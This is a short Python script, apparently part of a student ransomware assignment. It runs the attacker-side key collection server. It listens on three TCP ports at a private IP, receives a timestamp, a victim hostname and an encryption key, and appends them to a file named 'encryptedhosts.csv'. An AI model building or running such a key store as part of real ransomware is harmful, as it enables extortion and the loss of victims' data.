import socket
import csv
# import json

IP = "192.168.56.1"
port1 = 5666
port2 = 5678
port3 = 5679

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP, port1))
    s.listen(1)
    conn, addr = s.accept()

    with conn:
        while True:
            time = conn.recv(1024).decode()
            break

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP, port2))
    s.listen(1)
    conn, addr = s.accept()

    with conn:
        while True:
            hostname = conn.recv(1024).decode()
            break 

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP, port3))
    s.listen(1)
    conn, addr = s.accept()

    with conn:
        while True:
            key = conn.recv(1024).decode()
            break
        
with open('E:\Python Semester 2\Assignment\Ransom\Key_Storage\encryptedhosts.csv', 'a', newline='') as f:
    writer = csv.writer(f)
    writer.writerow([time, hostname, key])
